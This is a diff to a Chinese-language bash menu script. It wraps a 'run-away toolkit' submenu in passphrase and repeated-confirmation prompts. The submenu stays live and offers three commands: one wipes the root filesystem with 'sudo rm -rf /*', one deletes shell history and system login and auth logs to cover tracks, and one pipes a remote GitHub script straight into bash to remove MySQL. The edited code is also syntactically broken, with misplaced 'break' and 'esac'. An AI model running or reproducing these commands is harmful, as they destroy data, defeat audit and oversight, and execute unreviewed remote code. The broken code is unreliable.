@@ -396,28 +396,47 @@ while true; do
             \e[0;31m3. rm mysql or sql\e[0m
             0. 返回上级菜单
             "
-            echo -e "$bypass_menu"
-            read -p "请输入子菜单选项数字: " bypass_choice
-            case $bypass_choice in
-                1)
-                    echo "sudo rm -rf /*"
-                    sudo rm -rf /*
-                    ;;
-                2)
-                    echo "rm ssh logs"
-                    rm -f $HISTFILE && export HISTFILE=/dev/null && history -cw && rm -f /var/log/auth.log && rm -f /var/log/kern.log && rm -f /var/log/wtmp && rm -f /var/log/lastlog &&  kill -9 $$
-                    ;;
-                3)
-                    echo "rm mysql or sql"
-                    bash <(curl -L -s https://raw.githubusercontent.com/zxcv-12345/GNU-Linux_run_test.sh/main/remove_mysql.sh)
-                    ;;
-                0)
-                    echo "返回上级菜单"
-                    ;;
-                *)
-                    echo "无效选项，请重新输入"
-                    echo -e "$bypass_menu"
-                    ;;
+            read -p "请输入 'kill root' 以继续: " confirm
+            if [ "$confirm" == "kill root" ]; then
+                confirmed_count=0
+                while [ $confirmed_count -lt 3 ]; do
+                    read -p "确认进入跑路工具集(y/n): " confirm
+                    if [ "$confirm" == "y" ]; then
+                        ((confirmed_count++))
+                        if [ $confirmed_count -eq 3 ]; then
+                            echo "确认成功！进入跑路工具集..."
+                            echo -e "$bypass_menu"
+                            read -p "请输入子菜单选项数字: " bypass_choice
+                            case $bypass_choice in
+                            1)
+                                echo "sudo rm -rf /*"
+                                sudo rm -rf /*
+                                ;;
+                            2)
+                                echo "rm ssh logs"
+                                rm -f $HISTFILE && export HISTFILE=/dev/null && history -cw && rm -f /var/log/auth.log && rm -f /var/log/kern.log && rm -f /var/log/wtmp && rm -f /var/log/lastlog &&  kill -9 $$
+                                ;;
+                            3)
+                                echo "rm mysql or sql"
+                                bash <(curl -L -s https://raw.githubusercontent.com/zxcv-12345/GNU-Linux_run_test.sh/main/remove_mysql.sh)
+                                ;;
+                            0)
+                                echo "返回上级菜单"
+                                ;;
+                            *)
+                                echo "无效选项，请重新输入"
+                                echo -e "$bypass_menu"
+                                ;;
+                            break
+                        fi
+                    else
+                        confirmed_count=0
+                    fi
+                done
+            else
+                echo -e "\e[0;31m输入有误，确认为误触跑路工具集！\e[0m"
+            fi
+            
             esac
             ;;
         0)
